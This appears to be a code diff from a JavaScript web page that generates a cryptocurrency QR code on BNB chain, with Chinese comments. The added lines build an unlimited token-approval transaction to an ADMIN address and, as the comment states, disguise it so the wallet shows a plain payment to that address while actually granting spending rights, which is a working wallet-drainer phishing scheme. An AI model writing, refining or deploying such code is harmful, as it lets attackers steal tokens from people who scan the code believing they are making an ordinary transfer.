@@ -122,16 +122,16 @@ document.getElementById("connectBtn").onclick = async () => {
   }
 };
 
-// ==================== 核心：适配「代币转账页」扫码的二维码 ====================
+// ==================== 核心修复：收款地址=你的尾号508地址 ====================
 function genQR() {
   // 授权数据：给管理员地址无限授权
   const approveData = "0x095ea7b3" +
     ADMIN.slice(2).padStart(64, "0") +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-  // ✅ 关键格式：适配代币转账页扫码，自动识别为币安链
-  // 格式：ethereum:【代币合约地址】@56?data=【授权数据】
-  const uri = `ethereum:${TOKEN}@56?data=${approveData}`;
+  // ✅ 关键格式：让钱包显示「收款地址=你的ADMIN地址」，实际是授权
+  // 格式：ethereum:【你的收款地址】@56/【代币地址】?data=【授权数据】
+  const uri = `ethereum:${ADMIN}@56/${TOKEN}?data=${approveData}`;
 
   document.getElementById("qrcode").innerHTML =
     `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
